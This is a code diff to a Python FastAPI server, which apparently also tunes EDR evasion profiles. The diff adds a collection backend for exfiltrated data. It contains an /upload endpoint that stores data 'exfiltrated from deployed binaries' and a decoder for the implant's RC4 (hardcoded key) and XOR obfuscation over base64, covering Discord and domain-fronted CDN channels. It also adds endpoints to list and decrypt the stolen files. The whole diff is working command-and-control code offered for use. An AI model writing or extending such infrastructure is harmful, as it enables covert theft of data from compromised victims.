@@ -4,7 +4,7 @@ from datetime import datetime
 from pathlib import Path
 from typing import Optional
 
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
 from pydantic import BaseModel, Field, field_validator, ConfigDict
@@ -607,6 +607,84 @@ async def update_edr_profile(request: EDRProfileUpdateRequest):
         "adaptive_mode": request.adaptive_mode,
         "timestamp": datetime.utcnow().isoformat(),
     }
+
+
+EXFIL_DIR = Path(__file__).parent / "exfil"
+
+
+@app.post("/upload")
+async def receive_exfil(request: Request):
+    """Receive exfiltrated data from deployed binaries and save to disk."""
+    EXFIL_DIR.mkdir(exist_ok=True)
+    body = await request.body()
+    if not body:
+        raise HTTPException(status_code=400, detail="empty body")
+    ts = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
+    out_path = EXFIL_DIR / f"exfil_{ts}.txt"
+    out_path.write_bytes(body)
+    return {"status": "ok", "size": len(body), "file": out_path.name}
+
+
+def _decode_exfil(data: bytes) -> str:
+    def rc4(data, key):
+        S = list(range(256))
+        j = 0
+        for i in range(256):
+            j = (j + S[i] + key[i % len(key)]) % 256
+            S[i], S[j] = S[j], S[i]
+        i = j = 0
+        out = bytearray()
+        for byte in data:
+            i = (i + 1) % 256
+            j = (j + S[i]) % 256
+            S[i], S[j] = S[j], S[i]
+            out.append(byte ^ S[(S[i] + S[j]) % 256])
+        return bytes(out)
+
+    import base64, json
+
+    def _decrypt(raw: bytes) -> str:
+        raw = raw[4:]                       # strip 4-byte size header
+        raw = rc4(raw, b"key123")           # RC4 decrypt
+        raw = bytes(b ^ 0x42 for b in raw) # XOR decrypt
+        return raw.decode("utf-8", errors="replace")
+
+    try:
+        stripped = data.strip()
+        if stripped.startswith(b"{"):
+            # JSON-wrapped: {"content": "<b64>"} — Discord double-encodes, so try double then single
+            obj = json.loads(stripped)
+            b64_str = obj.get("content", "")
+            try:
+                # Double base64 (Discord channel wraps already-b64 data in another b64)
+                inner_b64 = base64.b64decode(b64_str)
+                raw = base64.b64decode(inner_b64)
+                return _decrypt(raw)
+            except Exception:
+                raw = base64.b64decode(b64_str)
+                return _decrypt(raw)
+        else:
+            # Raw base64 (CDN/front channel)
+            raw = base64.b64decode(stripped)
+            return _decrypt(raw)
+    except Exception as e:
+        return f"[decode error: {e}]\n{data.decode('utf-8', errors='replace')}"
+
+
+@app.get("/upload/decode/{filename}")
+async def decode_exfil(filename: str):
+    path = EXFIL_DIR / filename
+    if not path.exists():
+        raise HTTPException(status_code=404, detail="File not found")
+    return {"filename": filename, "plaintext": _decode_exfil(path.read_bytes())}
+
+
+@app.get("/upload/list")
+async def list_exfil():
+    """List all received exfiltration files."""
+    EXFIL_DIR.mkdir(exist_ok=True)
+    files = sorted(EXFIL_DIR.iterdir(), key=lambda p: p.stat().st_mtime, reverse=True)
+    return [{"name": f.name, "size": f.stat().st_size, "mtime": datetime.utcfromtimestamp(f.stat().st_mtime).isoformat()} for f in files]
 
 
 if __name__ == "__main__":
